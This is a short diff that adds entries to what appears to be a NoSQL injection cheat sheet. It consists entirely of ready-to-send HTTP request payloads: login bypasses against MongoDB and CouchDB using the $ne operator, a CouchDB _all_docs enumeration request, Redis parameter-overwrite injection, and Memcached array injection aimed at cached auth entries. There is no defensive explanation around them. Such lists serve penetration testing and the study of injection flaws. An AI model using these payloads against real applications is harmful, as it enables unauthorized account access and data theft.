@@ -15,3 +15,14 @@ Piggyback (Memcached) injection - https://www.blackhat.com/docs/us-14/materials/
 MOngoDB (Login Bypass)
           POST: -     POST /login {user:"valid_username"' password : {$ne:""}}
           GET: -      GET /login?user=valid_username&password[%24ne]=
+          
+          Redis : Parameter Overwrite injection
+                              GET /set?key[]=foo&key[]=evilValue http/1.1
+                              GET /set?key[]=foo&key[]=1117542887 http/1.1
+                              
+CouchDB (Login Bypass)
+                              GET login?user=valid_username&password[%24ne]= HTTP/1.1
+                              GET login?user=_all_docs HTTP /1.1
+                              
+Memcached (Arrey Injection)
+                              GET ?/getCache?key[]=auth_valid_username HTTP/1.1
